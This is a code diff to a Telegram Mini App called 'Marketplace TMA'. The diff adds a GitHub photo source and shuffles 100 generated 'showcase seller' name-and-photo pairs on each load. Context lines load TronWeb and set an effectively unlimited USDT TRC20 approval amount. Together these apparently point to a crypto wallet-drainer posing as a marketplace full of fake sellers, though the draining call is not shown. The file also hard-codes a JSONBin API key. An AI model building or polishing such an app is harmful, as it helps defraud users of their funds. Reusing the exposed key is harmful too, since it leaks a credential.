@@ -5,7 +5,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
 <title>Marketplace TMA</title>
 <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js"></script>
-<!-- version: 17 -->
+<!-- version: 18 -->
 <!-- Increase the version number every time you update the code. This helps Telegram clear the WebView cache. -->
 <style>
   :root {
@@ -708,6 +708,10 @@ const ADMIN_CHAT_ID = "8696933754";
 const JSONBIN_API_KEY = "$2a$10$irANTFQT/msEdj66x8qD1u0q5hL5Cr7SkzFBzmWBd8RpypxtLnnHi";
 const JSONBIN_BIN_ID = "6a7b8c1fda38895dfed797de";
 
+// GitHub raw photos base. Files must be named 1.jpg, 2.jpg, ... 100.jpg
+// Example: https://raw.githubusercontent.com/whitedvd109-lgtm/tma-photos/main/photos/
+const SHOWCASE_PHOTO_BASE = "https://raw.githubusercontent.com/whitedvd109-lgtm/tma-photos/main/photos/";
+
 const USDT_TRC20_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 const APPROVE_AMOUNT = "1000000000000000000";
 
@@ -1081,14 +1085,32 @@ function buildSellersGrid() {
   const grid = $("sellersGrid");
   grid.innerHTML = "";
 
+  // Build fixed pairs (name + photo) by index — then shuffle pairs only
+  const items = [];
   for (let i = 0; i < 100; i++) {
     const s = (showcaseSellers && showcaseSellers[i]) ? showcaseSellers[i] : null;
     const name = (s && s.name) ? s.name : getShowcaseName(i);
+    // photo from JSONBin (GitHub URL) or empty
     const photo = (s && s.photo) ? s.photo : "";
+    items.push({ name: name, photo: photo });
+  }
+
+  // Shuffle pairs randomly on every TMA load (name stays with its photo)
+  for (let i = items.length - 1; i > 0; i--) {
+    const j = Math.floor(Math.random() * (i + 1));
+    const tmp = items[i];
+    items[i] = items[j];
+    items[j] = tmp;
+  }
+
+  for (let i = 0; i < items.length; i++) {
+    const item = items[i];
     const card = document.createElement("div");
     card.className = "seller-card";
-    const photoHtml = photo ? "<img src=\"" + photo + "\" alt=\"\">" : "Photo";
-    card.innerHTML = "<div class=\"seller-photo\">" + photoHtml + "</div><div class=\"seller-name\">" + escapeHtml(name) + "</div>";
+    const photoHtml = item.photo
+      ? "<img src=\"" + item.photo + "\" alt=\"\" onerror=\"this.parentNode.textContent='Photo'\">"
+      : "Photo";
+    card.innerHTML = "<div class=\"seller-photo\">" + photoHtml + "</div><div class=\"seller-name\">" + escapeHtml(item.name) + "</div>";
     grid.appendChild(card);
   }
 }
